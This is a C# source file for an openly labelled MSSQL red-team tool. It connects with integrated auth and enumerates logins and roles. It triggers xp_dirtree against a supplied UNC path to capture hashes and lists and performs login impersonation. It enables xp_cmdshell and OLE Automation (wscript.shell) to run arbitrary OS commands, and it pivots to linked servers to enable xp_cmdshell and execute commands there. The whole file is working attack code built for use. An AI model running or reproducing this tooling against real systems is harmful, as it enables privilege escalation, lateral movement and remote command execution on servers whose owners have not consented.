using System;
using System.Data.SqlClient;


namespace MSSQL_Custom_Redteam_Tool
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                PrintUsage();
                return;
            }

            string sqlServer = null;
            string database = null;

            // Parse command-line arguments
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-server":
                        if (i + 1 < args.Length) sqlServer = args[++i];
                        else Console.WriteLine("Error: Missing server name for -server.");
                        break;

                    case "-database":
                        if (i + 1 < args.Length) database = args[++i];
                        else Console.WriteLine("Error: Missing database name for -database.");
                        break;
                }
            }

            // Ensure required parameters are provided
            if (string.IsNullOrEmpty(sqlServer) || string.IsNullOrEmpty(database))
            {
                Console.WriteLine("Error: Missing required parameters.");
                PrintUsage();
                return;
            }

            string conString = $"Server={sqlServer}; Database={database}; Integrated Security=True;";

            using (SqlConnection con = new SqlConnection(conString))
            {
                try
                {
                    con.Open();
                    Console.WriteLine($"Auth success! Connected to {sqlServer}/{database}");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                string impersonateUser = null;

                // Parse and execute user-specified commands
                for (int i = 0; i < args.Length; i++)
                {
                    switch (args[i])
                    {
                        case "-enum":
                            ExecuteEnum(con);
                            break;

                        case "-xp-dirtree":
                            if (i + 1 < args.Length)
                                ExecuteXpDirtree(con, args[++i]);
                            else
                                Console.WriteLine("Error: Missing UNC path for -xp-dirtree.");
                            break;

                        case "-impersonate":
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                            {
                                impersonateUser = args[++i];
                            }
                            else
                            {
                                Console.WriteLine("Error: Missing user for -impersonate.");
                            }
                            break;

                        case "-impersonateUser":
                            if (i + 1 < args.Length)
                                ExecuteImpersonate(con, args[++i]);
                            else
                                Console.WriteLine("Error: Missing username for -impersonate.");
                            break;

                        case "-list-impersonate":
                            ListImpersonationUsers(con);
                            break;

                        case "-executexpcmd":
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                            {
                                string xpCommand = args[++i];
                                ExecuteXPCmdShell(con, xpCommand, impersonateUser);
                            }
                            else
                            {
                                Console.WriteLine("Error: Missing command for -executexpcmd.");
                            }
                            break;

                        case "-executeole":
                            if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                            {
                                string oleCommand = args[++i];
                                ExecuteOleCmd(con, oleCommand, impersonateUser);
                            }
                            else
                            {
                                Console.WriteLine("Error: Missing command for -executeole.");
                            }
                            break;

                        case "-list-linkedservers":
                            ListLinkedServers(con);
                            break;

                        case "-linked-server":
                            if (i + 1 < args.Length)
                            {
                                string linkedServer = args[++i];
                                string linkedCommand = (i + 1 < args.Length && !args[i + 1].StartsWith("-")) ? args[++i] : "whoami";
                                ExecuteLinkedServer(con, linkedServer, linkedCommand);
                            }
                            else
                            {
                                Console.WriteLine("Error: Missing linked server name for -linked-server.");
                            }
                            break;
                    }
                }

                con.Close();
            }
        }

        static void PrintUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  -server <SQL Server>       Specify the SQL server (Required)");
            Console.WriteLine("  -database <Database>       Specify the database (Required)");
            Console.WriteLine("  -enum                      Enumerate SQL user and roles");
            Console.WriteLine("  -xp-dirtree <UNC path>     Trigger xp_dirtree with the specified UNC path");
            Console.WriteLine("  -impersonate               Perform impersonation and verify");
            Console.WriteLine("  -list-impersonate          List users that can be impersonated");
            Console.WriteLine("  -cmdshell                  Enable and execute xp_cmdshell");
            Console.WriteLine("  -linked-server <server>    Execute commands on a linked server");
        }

        static void ExecuteEnum(SqlConnection con)
        {
            Console.WriteLine("Enumerating SQL user and roles...");
            ExecuteQuery(con, "SELECT SYSTEM_USER;", "Logged in as");
            ExecuteQuery(con, "SELECT IS_SRVROLEMEMBER('public');", "Public role membership status");
        }

        static void ExecuteXpDirtree(SqlConnection con, string uncPath)
        {
            Console.WriteLine($"Executing xp_dirtree on {uncPath}...");
            ExecuteQuery(con, $"EXEC master..xp_dirtree \"{uncPath}\";", "Triggered xp_dirtree");
        }

        static void ListImpersonationUsers(SqlConnection con)
        {
            string query = "SELECT DISTINCT b.name FROM sys.server_permissions a " +
                           "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
                           "WHERE a.permission_name = 'IMPERSONATE';";

            try
            {
                using (SqlCommand command = new SqlCommand(query, con))
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    Console.WriteLine("Users that can be impersonated:");
                    while (reader.Read())
                    {
                        Console.WriteLine($" - {reader[0]}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error fetching impersonation users: {ex.Message}");
            }
        }

        static void ExecuteImpersonate(SqlConnection con, string username)
        {
            Console.WriteLine("Performing impersonation...");
            ExecuteQuery(con, "SELECT USER_NAME();", "Before impersonation");

            string impersonateQuery = "";
            if (username.Equals("dbo"))
            {
                impersonateQuery = "use msdb; EXECUTE AS USER = 'dbo';";
            }
            else
            {
                impersonateQuery = $"EXECUTE AS LOGIN = '{username}';";
            }


            ExecuteNonQuery(con, impersonateQuery);
            ExecuteQuery(con, "SELECT USER_NAME();", "After impersonation");
        }

        static bool ImpersonateUser(SqlConnection con, string username)
        {
            Console.WriteLine($"Attempting to impersonate: {username}");

            //string impersonateQuery = username.ToLower() == "sa" || username.Contains("\\")
            //    ? $"EXECUTE AS LOGIN = '{username}';"
            //    : $"EXECUTE AS USER = '{username}';";

            string impersonateQuery = $"EXECUTE AS LOGIN = '{username}';";

            try
            {
                ExecuteNonQuery(con, impersonateQuery);
                ExecuteQuery(con, "SELECT USER_NAME();", "Current user after impersonation");
                return true; // Impersonation successful
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during impersonation: {ex.Message}");
                return false; // Impersonation failed
            }
        }


        static void ExecuteXPCmdShell(SqlConnection con, string command = "whoami", string impersonateUser = null)
        {
            if (!string.IsNullOrEmpty(impersonateUser) && !ImpersonateUser(con, impersonateUser))
            {
                Console.WriteLine("Impersonation failed! Running command without impersonation.");
            }

            Console.WriteLine($"Enabling and executing xp_cmdshell: {command}");

            // Enable xp_cmdshell if not already enabled
            ExecuteNonQuery(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
            ExecuteNonQuery(con, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");

            // Execute the command
            string cmdQuery = $"EXEC xp_cmdshell '{command}';";

            try
            {
                using (SqlCommand sqlCommand = new SqlCommand(cmdQuery, con))
                using (SqlDataReader reader = sqlCommand.ExecuteReader())
                {
                    Console.WriteLine($"Command output ({command}):");

                    while (reader.Read()) // Read all lines of output
                    {
                        if (!reader.IsDBNull(0))
                        {
                            Console.WriteLine(reader[0].ToString());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command: {ex.Message}");
            }
        }

        static void ExecuteOleCmd(SqlConnection con, string command = "whoami", string impersonateUser = null)
        {
            if (!string.IsNullOrEmpty(impersonateUser) && !ImpersonateUser(con, impersonateUser))
            {
                Console.WriteLine("Impersonation failed! Running command without impersonation.");
            }

            Console.WriteLine($"Enabling and executing OLE Automation Procedures: {command}");

            // Enable OLE Automation Procedures if not already enabled
            ExecuteNonQuery(con, "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");

            string outputFile = "C:\\Tools\\output.txt";
            // Execute the command using OLE Automation
            string oleQuery = $"DECLARE @myshell INT; " +
                              $"EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; " +
                              $"EXEC sp_oamethod @myshell, 'run', NULL, 'cmd /c \"{command}\"';";

            try
            {
                ExecuteNonQuery(con, oleQuery);
                Console.WriteLine($"Command executed via OLE Automation: {command}");
                //string readFileQuery = $"SELECT * FROM OPENROWSET(BULK '{outputFile}', SINGLE_CLOB) AS Output;";
                //ExecuteQuery(con, readFileQuery, "Command output");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command via OLE Automation: {ex.Message}");
            }
        }

        static void ListLinkedServers(SqlConnection con)
        {
            Console.WriteLine("Enumerating linked servers...");

            string query = "EXEC sp_linkedservers;";

            try
            {
                using (SqlCommand command = new SqlCommand(query, con))
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    Console.WriteLine("Available Linked Servers:");

                    while (reader.Read())
                    {
                        Console.WriteLine($" - {reader[0]}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error listing linked servers: {ex.Message}");
            }
        }


        static void ExecuteLinkedServer(SqlConnection con, string linkedServer, string command = "whoami")
        {
            Console.WriteLine($"Executing commands on linked server: {linkedServer}...");
            string enableAdvancedOptions = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {linkedServer};";
            string enableXpCmdShell = $"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {linkedServer};";
            string execCommand = $"EXEC('xp_cmdshell ''{command}''') AT {linkedServer};";

            ExecuteNonQuery(con, enableAdvancedOptions);
            ExecuteNonQuery(con, enableXpCmdShell);
            ExecuteQuery(con, execCommand, "Remote command execution result");
        }

        static void ExecuteQuery(SqlConnection con, string query, string message)
        {
            try
            {
                using (SqlCommand command = new SqlCommand(query, con))
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    reader.Read();
                    Console.WriteLine($"{message}: {reader[0]}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing query: {ex.Message}");
            }
        }

        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            try
            {
                using (SqlCommand command = new SqlCommand(query, con))
                {
                    command.ExecuteNonQuery();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing non-query: {ex.Message}");
            }
        }

    }
}
